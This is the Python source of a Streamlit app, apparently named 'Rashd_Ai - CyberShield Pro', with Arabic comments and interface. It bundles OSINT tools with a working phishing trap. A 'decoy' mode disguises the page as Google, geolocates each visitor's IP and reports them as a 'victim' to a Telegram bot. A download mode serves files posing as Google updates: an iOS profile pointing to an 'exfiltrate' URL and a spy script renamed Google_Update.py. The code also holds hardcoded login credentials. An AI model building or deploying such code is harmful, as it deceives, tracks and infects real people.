import streamlit as st
import requests
import json
import os
from datetime import datetime
import victim_logger
import config
import base64
import uuid

# تحميل مفتاح TAVILY من Secrets إذا وجد
if "TAVILY_API_KEY" in st.secrets:
    os.environ["TAVILY_API_KEY"] = st.secrets["TAVILY_API_KEY"]

# استيراد الوحدات الخاصة بالأدوات (مع معالجة الخطأ إذا لم تكن موجودة)
try:
    import domain_osint
    import ai_pentest
    import port_scanner
    import network_mapper
    import google_dork
    import vuln_scanner
    import darkweb_search
    import ai_threat
    import email_osint
    import phone_osint
    import website_scan
    import username_osint
    import geoip_osint
    import attack_surface
    import ai_analysis
    import report_generator
    from ai_hacking import AIHackingAssistant
except ImportError as e:
    st.warning(f"بعض المكتبات مفقودة: {e}. سيتم تشغيل الأدوات الأساسية فقط.")

# إعدادات الصفحة
st.set_page_config(page_title="Rashd_Ai - CyberShield Pro", page_icon="🛡️", layout="wide")

# إخفاء واجهة Streamlit تماماً في وضع التمويه
hide_st_style = """
            <style>
            #MainMenu {visibility: hidden;}
            footer {visibility: hidden;}
            header {visibility: hidden;}
            .stApp [data-testid="stToolbar"] {display: none;}
            .stApp [data-testid="stDecoration"] {display: none;}
            .stApp [data-testid="stStatusWidget"] {display: none;}
            #manage-app-button {display: none !important;}
            [data-testid="stStatusWidget"] {display: none !important;}
            .st-emotion-cache-10trblm {display: none !important;}
            .st-emotion-cache-1dp5vir {display: none !important;}
            </style>
            """

# دالة جلب الـ IP العام من السيرفر
def get_server_side_ip():
    try:
        headers = st.context.headers
        if "X-Forwarded-For" in headers:
            return headers["X-Forwarded-For"].split(",")[0].strip()
        return "Unknown"
    except:
        return "Unknown"

# دالة إرسال التنبيه لتلجرام
def send_telegram_alert(ip, trap_name, device="Unknown"):
    token = config.get_key("TELEGRAM_BOT_TOKEN")
    chat_id = config.get_key("TELEGRAM_CHAT_ID")
    
    if not token or not chat_id:
        return
        
    geo_data = {"country": "Unknown", "city": "Unknown", "isp": "Unknown"}
    try:
        res = requests.get(f"http://ip-api.com/json/{ip}", timeout=5).json()
        if res.get("status") == "success":
            geo_data = {
                "country": res.get("country", "Unknown"),
                "city": res.get("city", "Unknown"),
                "isp": res.get("isp", "Unknown")
            }
    except:
        pass

    message = f"""
🎯 تنبيه: تم اكتشاف ضحية جديدة!

📍 عنوان IP: {ip}
🌍 الدولة: {geo_data['country']}
🏙️ المدينة: {geo_data['city']}
🏢 مزود الخدمة: {geo_data['isp']}
📱 الجهاز: {device}
🎯 المصيدة: {trap_name}
⏰ الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
    """
    
    try:
        requests.post(f"https://api.telegram.org/bot{token}/sendMessage", data={"chat_id": chat_id, "text": message})
        victim_logger.log_victim(ip, geo_data['country'], geo_data['city'], geo_data['isp'], trap_name)
    except:
        pass

# التحقق من وضع التمويه (Decoy Mode)
query_params = st.query_params
if "decoy" in query_params:
    st.markdown(hide_st_style, unsafe_allow_html=True)
    client_ip = query_params.get("ip", get_server_side_ip())
    trap_name = query_params.get("trap", "Google Decoy")
    
    if "alert_sent" not in st.session_state:
        send_telegram_alert(client_ip, trap_name)
        st.session_state.alert_sent = True

    with open("index.html", "r", encoding="utf-8") as f:
        html_content = f.read()
    st.components.v1.html(html_content, height=1000, scrolling=False)
    st.stop()

# معالجة طلبات التحميل المباشرة
if "download" in query_params:
    device = query_params.get("device", "pc")
    ip = query_params.get("ip", get_server_side_ip())
    send_telegram_alert(ip, f"Download ({device})", device)
    
    if device == "android":
        file_name = "Google_Update.apk"
        content = b"Fake APK Content for Google Update"
    elif device == "ios":
        file_name = "Google_Update.mobileconfig"
        # تم إصلاح هيكلية mobileconfig وحذف حقل Icon المسبب للخطأ
        content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>PayloadContent</key>
    <array>
        <dict>
            <key>PayloadDescription</key>
            <string>Google Security Update for iOS</string>
            <key>PayloadDisplayName</key>
            <string>Google Security</string>
            <key>PayloadIdentifier</key>
            <string>com.google.security.{uuid.uuid4()}</string>
            <key>PayloadType</key>
            <string>com.apple.webClip.managed</string>
            <key>PayloadUUID</key>
            <string>{uuid.uuid4()}</string>
            <key>PayloadVersion</key>
            <integer>1</integer>
            <key>Label</key>
            <string>Google Security</string>
            <key>URL</key>
            <string>https://rashdai.streamlit.app/?exfiltrate=true&amp;id={uuid.uuid4()}</string>
            <key>IsRemovable</key>
            <true/>
        </dict>
    </array>
    <key>PayloadDisplayName</key>
    <string>Google Security Update</string>
    <key>PayloadIdentifier</key>
    <string>com.google.update.{uuid.uuid4()}</string>
    <key>PayloadRemovalDisallowed</key>
    <false/>
    <key>PayloadType</key>
    <string>Configuration</string>
    <key>PayloadUUID</key>
    <string>{uuid.uuid4()}</string>
    <key>PayloadVersion</key>
    <integer>1</integer>
</dict>
</plist>""".encode('utf-8')
    else:
        file_name = "Google_Update.py"
        if os.path.exists("spy_full.py"):
            with open("spy_full.py", "r") as f:
                content = f.read().encode('utf-8')
        else:
            content = b"print('Google Update Service Started...')"
            
    st.download_button("بدء التحميل", content, file_name=file_name, mime="application/octet-stream")
    st.stop()

# --- الواجهة الرئيسية للمطور ---
if "authenticated" not in st.session_state:
    st.session_state.authenticated = False

if not st.session_state.authenticated:
    st.title("🛡️ تسجيل الدخول - Rashd_Ai")
    with st.form("login_form"):
        user = st.text_input("اسم المستخدم")
        pw = st.text_input("كلمة المرور", type="password")
        if st.form_submit_button("دخول"):
            if user == "Rashd919" and pw == "112233":
                st.session_state.authenticated = True
                st.rerun()
            else:
                st.error("بيانات خاطئة")
    st.stop()

st.title("🛡 منصة CyberShield Pro للذكاء الاستخباراتي و OSINT")

with st.sidebar:
    st.header("⚙️ الإعدادات")
    telegram_bot_token = st.text_input("Telegram Bot Token", value=config.get_key("TELEGRAM_BOT_TOKEN"), type="password")
    telegram_chat_id = st.text_input("Telegram Chat ID", value=config.get_key("TELEGRAM_CHAT_ID"))
    if st.button("حفظ إعدادات تلجرام"):
        config.set_key("TELEGRAM_BOT_TOKEN", telegram_bot_token)
        config.set_key("TELEGRAM_CHAT_ID", telegram_chat_id)
        st.success("تم الحفظ بنجاح!")
    
    if st.button("تسجيل الخروج"):
        st.session_state.authenticated = False
        st.rerun()

# التبويبات الـ 18 المطلوبة مع دمج الكود القديم
tab_names = [
    "💬 المحادثة", "🌐 تحليل الدومين", "🔍 فحص المواقع", "👤 بحث عن المستخدم", "📍 تحديد الموقع", 
    "🏗️ سطح الهجوم", "🧠 تحليل ذكي", "🤖 مساعد الهجوم", "🔎 Google Dork", 
    "📧 Email OSINT", "📱 Phone Lookup", "🌑 Dark Web", "🔌 Port Scanner", 
    "⚠️ Vulnerability Scanner", "🗺 Network Mapper", "🤖 AI Threat Analysis", "💡 AI Pentest Advisor", "📄 التقارير",
    "🎯 المصيدة"
]
tabs = st.tabs(tab_names)

# 0. المحادثة
with tabs[0]:
    st.header("💬 مساعد Rashd_Ai الذكي")
    if "messages" not in st.session_state:
        st.session_state.messages = []
    for message in st.session_state.messages:
        with st.chat_message(message["role"]):
            st.markdown(message["content"])
    if prompt := st.chat_input("كيف يمكنني مساعدتك اليوم؟"):
        st.session_state.messages.append({"role": "user", "content": prompt})
        with st.chat_message("user"):
            st.markdown(prompt)
        with st.chat_message("assistant"):
            try:
                # استخدام مساعد الهجوم الذكي إذا كان متوفراً
                assistant = AIHackingAssistant()
                response = assistant.chat(prompt)
            except:
                response = f"أنا مساعدك الذكي Rashd_Ai. لقد استلمت رسالتك: '{prompt}'."
            st.markdown(response)
        st.session_state.messages.append({"role": "assistant", "content": response})

# 1. تحليل الدومين
with tabs[1]:
    domain = st.text_input("أدخل اسم الدومين", key="domain_input")
    if st.button("تحليل الدومين", key="domain_btn"):
        try:
            whois = domain_osint.whois_lookup(domain)
            dns = domain_osint.dns_lookup(domain)
            subs = domain_osint.subdomain_scan(domain)
            st.write("WHOIS", whois)
            st.write("DNS", dns)
            st.write("النطاقات الفرعية المكتشفة", subs)
            st.session_state["domain"] = domain
            st.session_state["subs"] = subs
        except:
            st.error("أداة تحليل الدومين غير متوفرة حالياً.")

# 2. فحص المواقع
with tabs[2]:
    url = st.text_input("أدخل رابط الموقع", key="site_input")
    if st.button("فحص الموقع", key="site_btn"):
        try:
            tech = website_scan.detect_tech(url)
            headers = website_scan.header_analysis(url)
            emails = website_scan.extract_emails(url)
            st.write("التقنيات المكتشفة", tech)
            st.write("الهيدرز", headers)
            st.write("الإيميلات المكتشفة", emails)
            st.session_state["scan"] = {"tech": tech, "headers": headers, "emails": emails}
        except:
            st.error("أداة فحص المواقع غير متوفرة حالياً.")

# 3. بحث عن المستخدم
with tabs[3]:
    username = st.text_input("أدخل اسم المستخدم", key="username_input")
    if st.button("بحث عن المستخدم", key="username_btn"):
        try:
            result = username_osint.username_search(username)
            if isinstance(result, dict) and result:
                st.success("تم العثور على الحسابات التالية:")
                for platform, link in result.items():
                    st.write(f"✅ {platform} : {link}")
            else:
                st.info("لم يتم العثور على نتائج.")
        except:
            st.error("أداة البحث عن المستخدم غير متوفرة.")

# 4. تحديد الموقع
with tabs[4]:
    ip_geo = st.text_input("أدخل عنوان IP لتحديد موقعه", key="geo_input")
    if st.button("تحديد الموقع", key="geo_btn"):
        try:
            result = geoip_osint.get_geo_info(ip_geo)
            st.write("معلومات الموقع الجغرافي", result)
        except:
            st.error("أداة تحديد الموقع غير متوفرة.")

# 5. سطح الهجوم
with tabs[5]:
    target_attack = st.text_input("أدخل الهدف لتحليل سطح الهجوم", key="attack_input")
    if st.button("تحليل سطح الهجوم", key="attack_btn"):
        try:
            result = attack_surface.analyze(target_attack)
            st.write("نتائج تحليل سطح الهجوم", result)
        except:
            st.error("أداة تحليل سطح الهجوم غير متوفرة.")

# 6. تحليل ذكي
with tabs[6]:
    data_analysis = st.text_area("أدخل البيانات للتحليل الذكي", key="analysis_input")
    if st.button("بدء التحليل الذكي", key="analysis_btn"):
        try:
            result = ai_analysis.analyze_data(data_analysis)
            st.write("نتائج التحليل الذكي", result)
        except:
            st.error("أداة التحليل الذكي غير متوفرة.")

# 7. مساعد الهجوم
with tabs[7]:
    hacking_prompt = st.text_input("اسأل مساعد الهجوم", key="hacking_input")
    if st.button("إرسال لمساعد الهجوم", key="hacking_btn"):
        try:
            assistant = AIHackingAssistant()
            result = assistant.chat(hacking_prompt)
            st.write(result)
        except:
            st.error("مساعد الهجوم غير متوفر.")

# 8. Google Dork
with tabs[8]:
    dork_query = st.text_input("أدخل الكلمة المفتاحية لتوليد Dorks", key="dork_input")
    if st.button("توليد Dorks", key="dork_btn"):
        try:
            result = google_dork.generate_dorks(dork_query)
            st.write("Google Dorks المقترحة", result)
        except:
            st.error("أداة Google Dork غير متوفرة.")

# 9. Email OSINT
with tabs[9]:
    email_target = st.text_input("أدخل البريد الإلكتروني للبحث", key="email_input")
    if st.button("بحث عن الإيميل", key="email_btn"):
        try:
            result = email_osint.search_email(email_target)
            st.write("نتائج البحث عن الإيميل", result)
        except:
            st.error("أداة Email OSINT غير متوفرة.")

# 10. Phone Lookup
with tabs[10]:
    phone_target = st.text_input("أدخل رقم الهاتف (مع رمز الدولة)", key="phone_input")
    if st.button("بحث عن الهاتف", key="phone_btn"):
        try:
            result = phone_osint.lookup(phone_target)
            st.write("نتائج البحث عن الهاتف", result)
        except:
            st.error("أداة Phone Lookup غير متوفرة.")

# 11. Dark Web
with tabs[11]:
    dark_query = st.text_input("أدخل كلمة البحث في الدارك ويب", key="dark_input")
    if st.button("بحث في الدارك ويب", key="dark_btn"):
        try:
            result = darkweb_search.search(dark_query)
            st.write("نتائج البحث في الدارك ويب", result)
        except:
            st.error("أداة البحث في الدارك ويب غير متوفرة.")

# 12. Port Scanner
with tabs[12]:
    port_target = st.text_input("أدخل IP أو دومين لفحص المنافذ", key="port_input")
    if st.button("بدء فحص المنافذ", key="port_btn"):
        try:
            result = port_scanner.scan(port_target)
            st.write("المنافذ المفتوحة", result)
        except:
            st.error("أداة فحص المنافذ غير متوفرة.")

# 13. Vulnerability Scanner
with tabs[13]:
    vuln_target = st.text_input("أدخل الهدف لفحص الثغرات", key="vuln_input")
    if st.button("بدء فحص الثغرات", key="vuln_btn"):
        try:
            result = vuln_scanner.scan(vuln_target)
            st.write("الثغرات المكتشفة", result)
        except:
            st.error("أداة فحص الثغرات غير متوفرة.")

# 14. Network Mapper
with tabs[14]:
    net_target = st.text_input("أدخل الشبكة لرسم خريطتها", key="net_input")
    if st.button("رسم خريطة الشبكة", key="net_btn"):
        try:
            # تم إصلاح مشكلة st.image هنا لتجنب الخطأ
            file_path = network_mapper.map_network(net_target)
            if file_path and os.path.exists(file_path):
                st.image(file_path)
            else:
                st.warning("لم يتم توليد صورة للخريطة.")
        except:
            st.error("أداة رسم خريطة الشبكة غير متوفرة.")

# 15. AI Threat Analysis
with tabs[15]:
    threat_data = st.text_area("أدخل بيانات التهديد للتحليل", key="threat_input")
    if st.button("تحليل التهديد", key="threat_btn"):
        try:
            result = ai_threat.analyze(threat_data)
            st.write("نتائج تحليل التهديدات", result)
        except:
            st.error("أداة تحليل التهديدات غير متوفرة.")

# 16. AI Pentest Advisor
with tabs[16]:
    pentest_target = st.text_input("أدخل الهدف للحصول على خطة اختبار اختراق", key="pentest_input")
    if st.button("توليد خطة الاختراق", key="pentest_btn"):
        try:
            result = ai_pentest.generate_plan(pentest_target)
            st.write("خطة اختبار الاختراق المقترحة", result)
        except:
            st.error("أداة مستشار الاختراق غير متوفرة.")

# 17. التقارير
with tabs[17]:
    if st.button("توليد تقرير شامل", key="report_btn"):
        try:
            report_path = report_generator.generate_full_report()
            if report_path:
                with open(report_path, "rb") as f:
                    st.download_button("تحميل التقرير PDF", f, file_name="Rashd_Ai_Report.pdf")
            else:
                st.error("فشل توليد التقرير.")
        except:
            st.error("أداة توليد التقارير غير متوفرة.")

# 18. المصيدة
with tabs[18]:
    st.header("🎯 نظام المصيدة والتمويه")
    
    col1, col2 = st.columns(2)
    with col1:
        st.subheader("فخ جوجل الآلي")
        trap_id = st.text_input("اسم المصيدة (للتمييز)", value="Google_Trap")
        base_url = "https://rashdai.streamlit.app/"
        decoy_url = f"{base_url}?decoy=google&trap={trap_id}"
        st.code(decoy_url, language="text")
        st.info("هذا الرابط سيظهر كصفحة Google ويقوم بالتحميل التلقائي.")
        
    with col2:
        st.subheader("سجل الضحايا")
        if st.button("تحديث السجل"):
            victims = victim_logger.get_all_victims()
            if victims:
                st.table(victims)
            else:
                st.info("لا يوجد ضحايا مسجلين بعد.")

    st.divider()
    st.subheader("📊 الإحصائيات")
    victims = victim_logger.get_all_victims()
    if victims:
        st.write(f"إجمالي الضحايا: {len(victims)}")
        # يمكن إضافة رسوم بيانية هنا مستقبلاً
    else:
        st.write("لا توجد بيانات إحصائية.")
